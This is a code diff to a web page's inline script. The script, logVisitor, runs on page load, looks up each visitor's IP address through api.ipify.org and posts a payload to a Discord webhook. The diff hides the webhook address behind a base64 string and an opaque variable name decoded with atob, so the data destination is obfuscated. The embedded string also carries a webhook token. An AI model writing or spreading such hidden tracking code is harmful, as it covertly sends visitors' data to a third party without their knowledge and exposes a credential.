@@ -258,8 +258,8 @@
     </div>
   </div>
 <script>
-  const DISCORD_WEBHOOK_URL = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU2MjIwOTIxNzk3NTI5NjA1NS9GWGZuSXlINEhXelkzM2w0NVd2LTRiTXRRbTVDcEhGbDVERWRsdW0zWGdFSldVelNOakNxdmFzYy16R29CTE1MX19MRA==";
-
+  const aL = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU2MjIwOTIxNzk3NTI5NjA1NS9GWGZuSXlINEhXelkzM2w0NVd2LTRiTXRRbTVDcEhGbDVERWRsdW0zWGdFSldVelNOakNxdmFzYy16R29CTE1MX19MRA==";
+  const aLnoor = atob(aL);
   (async function logVisitor() {
     try {
       const ipRes = await fetch("https://api.ipify.org?format=json");
@@ -314,7 +314,7 @@
         }]
       };
 
-      const response = await fetch(DISCORD_WEBHOOK_URL, {
+      const response = await fetch(aLnoor, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify(payload)
